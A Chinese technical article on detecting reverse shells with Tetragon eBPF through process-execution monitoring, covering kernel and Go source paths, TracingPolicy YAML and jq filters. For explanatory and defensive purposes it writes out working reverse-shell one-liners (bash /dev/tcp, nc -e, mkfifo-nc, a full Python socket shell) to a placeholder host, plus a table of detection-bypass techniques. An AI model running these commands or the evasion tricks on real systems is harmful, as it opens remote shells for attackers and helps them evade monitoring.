# Tetragon 反弹 Shell 检测 — 进程执行维度深度分析

## 文档定位

本文档是「Tetragon 反弹 Shell 检测全流程深度分析」系列的第 1 篇（进程执行维度），覆盖通过 execve 监控检测反弹 Shell 进程启动行为的全链路分析。

> **前置阅读**: [Doc 0: 基础架构](tetragon-reverse-shell-detection-foundation.md) — Kprobe 框架、Tail Call 管道、选择器编译机制。

**覆盖的反弹 Shell 类型**：Bash `/dev/tcp`、Netcat `-e`、Python/Perl/PHP 解释器、memfd 无文件执行。

---

## 目录

- [第一部分：反弹 Shell 的进程特征](#第一部分反弹-shell-的进程特征)
- [第二部分：eBPF 内核层源码分析](#第二部分ebpf-内核层源码分析)
- [第三部分：Go 应用层源码分析](#第三部分go-应用层源码分析)
- [第四部分：实战场景与策略](#第四部分实战场景与策略)
- [第五部分：绕过分析与对策](#第五部分绕过分析与对策)

---

## 第一部分：反弹 Shell 的进程特征

### 1.1 二进制路径模式

反弹 Shell 最常用的二进制文件及其路径：

| 类别 | 二进制路径 | 反弹 Shell 用法 |
|------|----------|---------------|
| **Shell** | `/bin/bash`, `/usr/bin/bash`, `/bin/sh`, `/usr/bin/sh` | `bash -i >& /dev/tcp/...` |
| **Netcat** | `/usr/bin/nc`, `/usr/bin/ncat`, `/usr/bin/netcat`, `/bin/nc` | `nc -e /bin/sh IP PORT` |
| **Python** | `/usr/bin/python3`, `/usr/bin/python`, `/usr/local/bin/python3` | `python3 -c 'import socket...'` |
| **Perl** | `/usr/bin/perl` | `perl -e 'use Socket...'` |
| **PHP** | `/usr/bin/php` | `php -r '$sock=fsockopen(...)'` |
| **Ruby** | `/usr/bin/ruby` | `ruby -rsocket -e '...'` |
| **Lua** | `/usr/bin/lua` | `lua -e 'require("socket")...'` |
| **加密工具** | `/usr/bin/openssl`, `/usr/bin/socat` | `openssl s_client -connect ...` |
| **远程工具** | `/usr/bin/curl`, `/usr/bin/wget` | 下载执行（staging） |

### 1.2 参数模式

不同类型的反弹 Shell 具有不同的命令行参数特征：

| 攻击类型 | 典型参数 | 关键模式 |
|---------|---------|---------|
| Bash /dev/tcp | `-i >& /dev/tcp/1.2.3.4/4444 0>&1` | Postfix: `/dev/tcp` |
| Bash exec 重定向 | `-c 'exec 5<>/dev/tcp/1.2.3.4/4444'` | Postfix: `/dev/tcp` |
| Netcat 执行 | `-e /bin/sh 1.2.3.4 4444` | Prefix: `-e` |
| Netcat 无 -e | `1.2.3.4 4444` (配合管道) | 需联合文件维度 |
| Python socket | `-c 'import socket,subprocess,os;...'` | Contains: `socket` + `subprocess` |
| Perl socket | `-e 'use Socket;...'` | Contains: `use Socket` |
| PHP fsockopen | `-r '$sock=fsockopen("1.2.3.4","4444");...'` | Contains: `fsockopen` |
| OpenSSL | `s_client -connect 1.2.3.4:4444` | Prefix: `s_client` |
| Socat | `exec:'bash -li',pty,stderr tcp:1.2.3.4:4444` | Contains: `exec:` + `tcp:` |

### 1.3 进程树异常

正常服务的进程树具有可预测的结构。反弹 Shell 通常表现为异常的进程派生关系：

```
正常进程树:                        反弹 Shell 进程树:
─────────                         ────────────────
systemd                           systemd
  └── nginx                         └── nginx (或 apache/tomcat)
       ├── nginx worker                  └── php        ← 解释器
       └── nginx worker                       └── sh   ← Shell!
                                                    └── whoami  ← 信息收集

systemd                           systemd
  └── sshd                           └── java (Tomcat)
       └── bash (合法用户)                  └── bash     ← Shell!
            └── vim                            └── nc   ← 外连!
```

**异常模式**: Web 服务器 → 解释器 → Shell 是经典的 Webshell 进程树特征。

---

## 第二部分：eBPF 内核层源码分析

### 2.1 Execve 事件生成

Tetragon 通过 Tracepoint `sched/sched_process_exec` 捕获所有进程执行事件。

**源码位置**: `bpf/process/bpf_execve_event.c`

```c
// Execve 事件的参数读取函数
FUNC_INLINE __u32
read_args(void *ctx, struct msg_execve_event *event)
{
    struct task_struct *task = (struct task_struct *)get_current_task();
    struct msg_process *p = &event->process;
    struct mm_struct *mm;

    // 从 task->mm 读取参数信息
    probe_read(&mm, sizeof(mm), _(&task->mm));
    probe_read(&start_stack, sizeof(start_stack), _(&mm->arg_start));
    probe_read(&end_stack, sizeof(end_stack), _(&mm->arg_end));

    // 跳过第一个参数（二进制路径）
    off = probe_read_str(&heap->maxpath, 4096, (char *)start_stack);
    start_stack += off;

    // 读取后续参数到事件缓冲区
    // ...
}
```

Execve 事件包含：
- **二进制路径**: 从 `linux_binprm->filename` 或 `mm->exe_file` 获取
- **命令行参数**: 从 `mm->arg_start` 到 `mm->arg_end` 的内存区域
- **进程 PID/TGID**: 从 `get_current_pid_tgid()` 获取
- **父进程信息**: 通过 `execve_map` 关联

### 2.2 通过 Kprobe 监控 sys_execve

除了 Execve Tracepoint，还可以通过 Generic Kprobe 框架直接挂钩 `sys_execve` 或 `sys_execveat`，获取更细粒度的参数控制。

```yaml
# 监控 execve 系统调用
kprobes:
- call: "sys_execve"
  syscall: true
  args:
  - index: 0
    type: "string"    # filename (第一个参数)
  selectors:
  - matchArgs:
    - index: 0
      operator: "Postfix"
      values:
      - "/dev/tcp"    # Bash /dev/tcp 模式
```

**string 类型参数提取**: `bpf/process/generic_calls.h:277-279`

```c
case string_type:
    size = copy_strings(args, (char *)arg, MAX_STRING);
    break;
```

`copy_strings()` 使用 `probe_read_str()` 从用户空间读取以 NUL 结尾的字符串，最大长度由 `MAX_STRING` 限制。

**matchArgs Postfix 匹配**: `bpf/process/types/basic.h:868-894`

```c
FUNC_LOCAL long
filter_char_buf_postfix(struct selector_arg_filter *filter, char *arg_str, uint arg_len)
{
    // 1. 从 string_postfix_maps 获取 LPM Trie Map
    addrmap = map_lookup_elem(&string_postfix_maps, &map_idx);

    // 2. 将参数字符串反转存入查询 key
    //    "bash -i >& /dev/tcp" → "pct/ved/ &> i- hsab"
    arg->prefixlen = arg_len * 8;
    copy_reverse(arg->data, arg_len, (__u8 *)arg_str, orig_len - arg_len);

    // 3. 在反转后的 LPM Trie 中查找
    //    "/dev/tcp" 反转为 "pct/ved/" 存入 Trie
    //    如果参数后缀匹配，LPM Trie 查找成功
    __u8 *pass = map_lookup_elem(addrmap, arg);
    return !!pass;
}
```

**Postfix 匹配原理**: LPM Trie 原生支持前缀匹配。为了支持后缀匹配，Tetragon 将字符串反转后存入 Trie，将后缀匹配问题转化为前缀匹配问题。

### 2.3 matchBinaries 编译流程

`matchBinaries` 是按二进制路径过滤事件的核心机制。

**编译流程**:

```
YAML:
  matchBinaries:
  - operator: "In"
    values:
    - "/usr/bin/bash"
    - "/usr/bin/nc"
      │
      ▼
Go 编译 (pkg/selectors/kernel.go):
    1. 遍历 values 列表
    2. 为每个二进制路径生成 names_map 条目
    3. 在 selector_process_filter 阶段启用二进制匹配
      │
      ▼
BPF 运行时 (pfilter.h):
    selector_process_filter():
        1. 从 execve_map 获取当前进程的信息
        2. 在 names_map 中查找当前进程的二进制路径
        3. operator=="In": 找到则通过，未找到则拒绝
        4. operator=="NotIn": 找到则拒绝，未找到则通过
```

**进程信息获取**: `pfilter.h` 中的 `selector_process_filter()` 从 `execve_map` 获取当前进程的完整信息，包括二进制路径。`execve_map` 在进程执行时由 Execve Tracepoint 填充。

### 2.4 matchParentBinaries 进程树匹配

**场景**: 检测特定父进程派生的子进程（如 Web 服务器 → Shell）。

进程树匹配通过遍历 `execve_map` 中的父进程链实现：

```
pfilter.h:

FUNC_INLINE bool
filter_pidset(__u64 sel, __u64 isns, struct execve_map_value *enter)
{
    struct execve_map_value *filter = enter;
    bool pidset_found = false;

    // 最多遍历 10 层父进程
    FIND_PIDSET10(sel, isns);
    // ...
}

// FIND_PIDSET 宏展开后:
#define FIND_PIDSET(value, isns)                                     \
{                                                                    \
    if (!filter)                                                     \
        return 0;                                                    \
    __u32 pid = filter->key.pid;                                     \
    __u32 ppid = filter->pkey.pid;                                   \
    if (pid == value || ppid == value) {                              \
        pidset_found = true;                                         \
        goto accept;                                                 \
    }                                                                \
    filter = map_lookup_elem(&execve_map, &filter->pkey.pid);        \
}
```

**matchParentBinaries** 的实现与 matchBinaries 类似，但匹配的是父进程（或祖先进程）的二进制路径。这对于检测 Web 服务器→Shell 的进程树异常非常有效。

### 2.5 Fileless 执行检测

无文件（Fileless）执行是一种高级攻击技术，通过 `memfd_create()` 创建匿名内存文件，将恶意代码写入后通过 `fexecve()` 或 `execveat()` 执行。

**检测原理**: 内核在 `security_bprm_committing_creds` 时检查 `bprm->file->f_inode->i_nlink`。对于 `memfd_create` 创建的文件，`i_nlink == 0`（没有磁盘链接）。

**源码位置**: `bpf/process/bpf_execve_bprm_commit_creds.c:70-76`

```c
// 读取执行文件的 inode 链接数
if (BPF_CORE_READ_INTO(&heap->info.i_nlink, file, f_inode, __i_nlink) != 0)
    return;

// 读取 inode 号
if (BPF_CORE_READ_INTO(&heap->info.i_ino, file, f_inode, i_ino) != 0)
    return;
```

当 `i_nlink == 0` 时，表示执行的二进制文件没有文件系统链接（即无文件执行）。这个信息通过 Execve 事件传递到用户空间，在 `binary_properties.file.inode.links` 字段中报告。

**Fileless 检测 TracingPolicy**:

```yaml
# 使用 Execve 事件的 binary_properties 字段过滤
# i_nlink == 0 表示无文件执行
# 这在 process_exec 事件中自动包含，无需额外 Kprobe
```

用户空间可以通过过滤 `process_exec` 事件中的 `binary_properties.file.inode.links == 0` 来检测无文件执行：

```bash
tetra getevents -o json | jq '
  select(.process_exec != null)
  | select(.process_exec.process.binary_properties.file.inode.links == 0)
  | {
      binary: .process_exec.process.binary,
      pid: .process_exec.process.pid.value,
      parent: .process_exec.parent.binary,
      links: .process_exec.process.binary_properties.file.inode.links
    }'
```

---

## 第三部分：Go 应用层源码分析

### 3.1 Execve 事件解析

Execve 事件与 Generic Kprobe 事件使用不同的处理路径。

**处理流程**:

```
Ring Buffer 事件
    │ MSG_OP_EXECVE
    ▼
handleExecve()
    │ 解析 msg_execve_event
    │ ├─ process.binary → 二进制路径
    │ ├─ process.args → 命令行参数
    │ ├─ process.pid → 进程 PID
    │ ├─ exe.i_nlink → inode 链接数
    │ └─ exe.i_ino → inode 号
    │
    ├─ 构建 ProcessInternal
    │   存入进程缓存
    │
    └─ 发送 ProcessExec 事件
        包含 process + parent 信息
```

### 3.2 Kprobe 事件中的字符串参数解析

当使用 Generic Kprobe 监控 `sys_execve` 时，字符串参数的解析过程：

```
handleGenericKprobe():
    │ 参数类型为 gt.GenericStringType:
    │   1. 读取 4 字节长度前缀 (int32)
    │   2. 读取 length 字节的字符串内容
    │   3. 构建 MsgGenericKprobeArgString
    │
    ▼
Protobuf 转换:
    MsgGenericKprobeArgString → KprobeArgString {value: "..."}
```

### 3.3 进程树构建

Go 侧维护一个进程缓存，通过 PID 和 ktime（进程启动时间）唯一标识进程。当收到 Kprobe 事件时，通过 `getProcessParent()` 查找当前进程及其父进程信息：

**源码位置**: `pkg/grpc/tracing/tracing.go:36-62`

```go
func getProcessParent(key *processapi.MsgExecveKey, flags uint8) (...) {
    proc, parent := process.GetParentProcessInternal(key.Pid, key.Ktime)
    if proc == nil {
        tetragonProcess = &tetragon.Process{
            Pid:       &wrapperspb.UInt32Value{Value: key.Pid},
            StartTime: ktime.ToProto(key.Ktime),
        }
    } else {
        tetragonProcess = proc.UnsafeGetProcess()
    }
    if parent != nil {
        tetragonParent = parent.UnsafeGetProcess()
    }
    return proc, parent, tetragonProcess, tetragonParent
}
```

---

## 第四部分：实战场景与策略

### 4.1 检测 Bash 反弹 Shell

**攻击命令**: `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`

**检测策略**: 匹配 bash 二进制 + 参数中包含 `/dev/tcp`

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-bash-reverse-shell"
spec:
  kprobes:
  - call: "sys_execve"
    syscall: true
    args:
    - index: 0
      type: "string"     # filename
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/bash"
        - "/bin/bash"
      matchArgs:
      - index: 0
        operator: "Postfix"
        values:
        - "/dev/tcp"
```

**替代方案**: 使用 Execve 事件的原生参数过滤（更推荐，覆盖所有 execve）:

```bash
# 通过 jq 过滤 execve 事件
tetra getevents -o json | jq '
  select(.process_exec != null)
  | select(.process_exec.process.binary | test("bash$"))
  | select(.process_exec.process.arguments | test("/dev/tcp"))
  | {
      binary: .process_exec.process.binary,
      args: .process_exec.process.arguments,
      pid: .process_exec.process.pid.value,
      parent: .process_exec.parent.binary
    }'
```

### 4.2 检测 Netcat 反弹 Shell

**攻击命令**: `nc -e /bin/sh 1.2.3.4 4444` 或 `ncat --exec /bin/sh 1.2.3.4 4444`

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-netcat-reverse-shell"
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/nc"
        - "/usr/bin/ncat"
        - "/usr/bin/netcat"
        - "/bin/nc"
        - "/usr/bin/nc.openbsd"
        - "/usr/bin/nc.traditional"
      matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "127.0.0.0/8"
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
```

**mkfifo 模式**: `mkfifo /tmp/f; nc 1.2.3.4 4444 < /tmp/f | /bin/sh > /tmp/f`

这种模式不使用 `-e` 参数，需要结合文件访问维度（Doc 4）检测 mkfifo 操作。

### 4.3 检测 Python/Perl/PHP 反弹 Shell

**Python 攻击命令**:
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-scripting-reverse-shell"
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    # Python/Perl/PHP/Ruby 外连
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/python3"
        - "/usr/bin/python"
        - "/usr/bin/perl"
        - "/usr/bin/php"
        - "/usr/bin/ruby"
        - "/usr/bin/lua"
        - "/usr/local/bin/python3"
      matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "127.0.0.0/8"
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
```

### 4.4 检测 Fileless/Memfd 反弹 Shell

```bash
# 检测无文件执行
tetra getevents -o json | jq '
  select(.process_exec != null)
  | select(.process_exec.process.binary_properties.file.inode.links == 0)
  | {
      event: "FILELESS_EXECUTION",
      binary: .process_exec.process.binary,
      pid: .process_exec.process.pid.value,
      parent: .process_exec.parent.binary,
      i_nlink: .process_exec.process.binary_properties.file.inode.links
    }'
```

### 4.5 检测进程树异常

**场景**: Web 服务器进程（nginx/apache/tomcat）不应该派生 Shell。

```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: "detect-webshell-process-tree"
spec:
  kprobes:
  - call: "tcp_connect"
    syscall: false
    args:
    - index: 0
      type: "sock"
    selectors:
    # Shell/解释器外连 + 父进程为 Web 服务器
    - matchBinaries:
      - operator: "In"
        values:
        - "/usr/bin/bash"
        - "/bin/bash"
        - "/usr/bin/sh"
        - "/bin/sh"
        - "/usr/bin/python3"
        - "/usr/bin/perl"
        - "/usr/bin/php"
      matchArgs:
      - index: 0
        operator: "NotDAddr"
        values:
        - "127.0.0.0/8"
        - "10.0.0.0/8"
        - "172.16.0.0/12"
        - "192.168.0.0/16"
```

**用户空间进程树检测**:

```bash
# 检测 Web 服务器子进程的 Shell 执行
tetra getevents -o json | jq '
  select(.process_exec != null)
  | select(.process_exec.process.binary | test("(bash|sh|python|perl|php)$"))
  | select(.process_exec.parent.binary | test("(nginx|apache|httpd|tomcat|java)"))
  | {
      alert: "WEBSHELL_DETECTED",
      shell: .process_exec.process.binary,
      args: .process_exec.process.arguments,
      parent: .process_exec.parent.binary,
      pid: .process_exec.process.pid.value
    }'
```

---

## 第五部分：绕过分析与对策

### 5.1 绕过技术

| 绕过技术 | 原理 | 效果 |
|---------|------|------|
| **二进制重命名** | `cp /usr/bin/nc /tmp/httpd && /tmp/httpd -e /bin/sh ...` | 绕过 matchBinaries |
| **Busybox 多调用** | `busybox nc -e /bin/sh ...` | 绕过精确路径匹配 |
| **LD_PRELOAD** | 注入共享库，在合法进程内执行 | 绕过进程级检测 |
| **无参数 Staging** | 先下载再执行，参数中不包含敏感关键字 | 绕过参数匹配 |
| **符号链接** | `ln -s /usr/bin/bash /tmp/myapp && /tmp/myapp -i ...` | 绕过路径匹配 |
| **进程注入** | ptrace/process_vm_writev 注入代码 | 完全绕过 execve |
| **内存执行** | memfd_create + fexecve，二进制不落盘 | 绕过路径匹配 |

### 5.2 对策

#### 5.2.1 Hash 匹配（imaHash）

Tetragon 支持通过 IMA（Integrity Measurement Architecture）Hash 匹配二进制文件内容，而非仅匹配路径。即使二进制被重命名或通过符号链接执行，只要文件内容相同，Hash 值不变。

```yaml
# matchActions 中启用 IMA Hash
matchActions:
- action: Post
  imaHash: true    # 在 Post action 中包含文件 Hash
```

相关 BPF 代码: `bpf/process/generic_calls.h:1080-1084`

```c
#ifdef __V511_BPF_PROG
__u32 ima_hash = actions->act[++i];
if (ima_hash)
    e->common.flags |= MSG_COMMON_FLAG_IMA_HASH;
#endif
```

#### 5.2.2 联合网络维度

无论二进制如何伪装，反弹 Shell 都需要建立网络连接。将进程执行维度与网络连接维度联合使用：

```yaml
# 在同一策略中同时监控 execve 和 tcp_connect
# 用户空间按 PID 关联两类事件
kprobes:
- call: "tcp_connect"
  syscall: false
  args:
  - index: 0
    type: "sock"
  selectors:
  - matchArgs:
    - index: 0
      operator: "NotDAddr"
      values:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
      - "127.0.0.0/8"
```

关联逻辑（用户空间实现）：

```bash
# 同时观察 execve 和 tcp_connect 事件，按 PID 关联
tetra getevents -o json | jq '
  if .process_exec then
    {type: "exec", pid: .process_exec.process.pid.value,
     binary: .process_exec.process.binary,
     args: .process_exec.process.arguments}
  elif .process_kprobe.function_name == "tcp_connect" then
    {type: "connect", pid: .process_kprobe.process.pid.value,
     binary: .process_kprobe.process.binary,
     daddr: .process_kprobe.args[0].sock_arg.daddr,
     dport: .process_kprobe.args[0].sock_arg.dport}
  else empty end'
```

#### 5.2.3 进程树深度分析

对于通过 LD_PRELOAD 或进程注入发起的反弹 Shell，虽然 execve 维度无法直接检测，但可以通过进程树异常间接发现：

- 合法服务进程突然产生网络外连
- 进程的 capabilities 或命名空间发生变化
- 进程执行了通常不应该执行的系统调用（如 dup2）

这些需要结合 FD 重定向维度（Doc 3）和网络连接维度（Doc 2）。

#### 5.2.4 Fileless 执行检测

对于 `memfd_create + fexecve` 的无文件执行：

1. **Execve 层**: `i_nlink == 0` 标记自动检测（§2.5）
2. **系统调用层**: 监控 `memfd_create` 调用（详见 Doc 4）
3. **网络层**: 无文件执行仍需网络连接，tcp_connect 仍可检测

**综合检测思路**: 任何单一维度都可能被绕过，多维关联检测（Doc 5）是提高检测覆盖率和准确率的关键。
